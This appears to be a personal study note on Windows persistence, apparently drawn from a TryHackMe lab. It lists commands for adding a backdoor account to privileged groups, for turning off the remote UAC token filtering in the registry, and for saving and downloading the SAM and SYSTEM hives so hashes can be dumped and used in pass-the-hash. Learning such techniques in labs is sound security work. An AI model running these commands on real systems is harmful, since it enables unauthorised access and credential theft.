# Windows  Persistance

For general overview of persistance that OS neutral: [[Persistence]].

## Tampering With unprivileged Accounts

Unprivileged Accounts less monitored than administrative accounts Assigning Groups Memberships is a direct way to gain administrative privileges.

```powershell
net localgroup administrators hacker /add
net localgroup "Backup Operators" hacker /add # Less suspicious - cant RDP or WinRM
net localgroup "Remote Management Users" hacker /add # Same as the above but can remote in
```

`LocalAccountTokenFilterPolicy` from [[Windows-User-Account-Control]] strips any local account of its administrativge privileges when logging in remotely, to regain those change them in the registery:

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

With Evil-WinRm (see [[Evil-winrm-Cheatsheet]]) we can backup SAM and SYSTEM files and dowload them 

```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

With [[Impacket-Cheatsheet]] `secretsdump.py` we can dump the hashes of those files, and use Evil-Winrm to perform a pass-the-hash attack.

## Special Privileges and Security Descriptors
[Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)



## References
[THM Windows Persistance Room](https://tryhackme.com/room/windowslocalpersistence)